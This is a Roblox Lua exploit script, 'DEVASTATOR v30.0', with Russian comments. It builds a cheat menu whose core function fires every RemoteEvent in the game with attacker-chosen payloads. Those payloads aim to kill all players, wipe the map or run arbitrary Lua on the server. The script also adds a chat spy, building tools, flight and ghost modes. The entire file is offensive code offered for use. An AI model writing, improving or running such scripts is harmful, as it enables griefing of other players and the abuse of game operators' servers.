--[[
    DEVASTATOR v30.0 // THE FINAL OVERLORD
    STATUS: ALL SYSTEMS ACTIVE
    CONTROLS: 'L' - Menu | 'E' - Fly | 'Z' - Ghost Mode
]]

local p = game:GetService("Players")
local lp = p.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local cg = game:GetService("CoreGui")
local lit = game:GetService("Lighting")

-- [1] UI INITIALIZATION
if cg:FindFirstChild("DevFinal") then cg.DevFinal:Destroy() end
local sg = Instance.new("ScreenGui", cg) sg.Name = "DevFinal"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 550, 0, 550)
main.Position = UDim2.new(0.5, -275, 0.5, -275)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
main.Active = true main.Draggable = true
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main) stroke.Color = Color3.new(1, 0, 0) stroke.Thickness = 2

-- TITLE
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = " DEVASTATOR v30.0 // OVERLORD SYSTEM"
title.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Code
Instance.new("UICorner", title)

-- !!! ТЕКСТОВОЕ ПОЛЕ (ДЛЯ ID И КОДА) !!!
local inp = Instance.new("TextBox", main)
inp.Size = UDim2.new(0, 480, 0, 40)
inp.Position = UDim2.new(0.5, -240, 0, 50)
inp.PlaceholderText = "ВВЕДИТЕ ID АССЕТА ИЛИ LUA КОД"
inp.Text = ""
inp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
inp.TextColor3 = Color3.new(1, 1, 1)
inp.Font = Enum.Font.Code
Instance.new("UICorner", inp)

-- ТЕРМИНАЛ ЛОГОВ
local logs = Instance.new("ScrollingFrame", main)
logs.Size = UDim2.new(1, -20, 0, 100)
logs.Position = UDim2.new(0, 10, 1, -110)
logs.BackgroundColor3 = Color3.new(0, 0, 0)
local lay = Instance.new("UIListLayout", logs)

local function log(txt, col)
    local l = Instance.new("TextLabel", logs)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = " [>] " .. tostring(txt)
    l.TextColor3 = col or Color3.new(1, 0, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    logs.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y)
    logs.CanvasPosition = Vector2.new(0, 9999)
end

-- [2] ЯДРО ВЗЛОМА (BRUTEFORCE BYPASS)
local function attack(code_id, payload)
    log("INITIALIZING ATTACK ON 58 TARGETS...", Color3.new(1, 1, 0))
    local count = 0
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            count = count + 1
            task.spawn(function()
                task.wait(count * 0.15) -- Защита от кика (Anti-Spam Delay)
                pcall(function() v:FireServer(code_id, payload) end)
                pcall(function() v:FireServer(payload) end)
            end)
        end
    end
    log("ATTACK DISPATCHED. WAIT FOR SERVER RESPONSE.")
end

-- [3] СЕТКА КНОПОК
local g = Instance.new("Frame", main)
g.Size = UDim2.new(1, -20, 0, 280)
g.Position = UDim2.new(0, 10, 0, 100)
g.BackgroundTransparency = 1
Instance.new("UIGridLayout", g).CellSize = UDim2.new(0, 170, 0, 35)

local function btn(txt, cb, col)
    local b = Instance.new("TextButton", g)
    b.Text = txt
    b.BackgroundColor3 = col or Color3.fromRGB(30, 30, 30)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

-- ФУНКЦИОНАЛ КНОПОК
btn("SKY (BRUTEFORCE)", function() attack(882, "rbxassetid://"..inp.Text) end, Color3.fromRGB(0, 80, 0))
btn("AUDIO (BRUTEFORCE)", function() attack(993, "rbxassetid://"..inp.Text) end, Color3.fromRGB(0, 80, 0))
btn("KILL ALL", function() attack(771, "for _,v in pairs(game.Players:GetPlayers()) do v.Character:BreakJoints() end") end, Color3.fromRGB(120, 0, 0))
btn("NUKE MAP", function() attack(771, "workspace:ClearAllChildren()") end, Color3.fromRGB(120, 0, 0))
btn("REMOTE EXEC", function() attack(771, inp.Text) end, Color3.fromRGB(150, 0, 150))
btn("CHAT SPY", function() 
    log("CHAT SPY ACTIVE (F9 TO VIEW)")
    local chat = rs:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
    chat.OnClientEvent:Connect(function(d) print("["..d.FromSpeaker.."]: "..d.Message) end)
end)
btn("GIVE B-TOOLS", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("B-Tools ready") end)
btn("GHOST (Z)", function() 
    for _, v in pairs(lp.Character:GetDescendants()) do 
        if v:IsA("BasePart") or v:IsA("Decal") then v.Transparency = 0.8 end 
    end 
    log("GHOST FORM ACTIVE")
end)
btn("VOID ESCAPE", function() lp.Character.HumanoidRootPart.CFrame = CFrame.new(0, 5000, 0) end)
btn("FPS BOOST", function() for _,v in pairs(game:GetDescendants()) do if v:IsA("DataModelMesh") then v:Destroy() end end end)

-- [4] FLY & HOTKEYS
local flying = false
uis.InputBegan:Connect(function(k, m)
    if m then return end
    if k.KeyCode == Enum.KeyCode.E then
        flying = not flying
        local hrp = lp.Character.HumanoidRootPart
        if flying then
            local bv = Instance.new("BodyVelocity", hrp)
            bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
            task.spawn(function()
                while flying do
                    bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * 80
                    task.wait()
                end
                bv:Destroy()
            end)
        end
    elseif k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible end
end)

log("DEVASTATOR v30.0 FULL LOADED.")
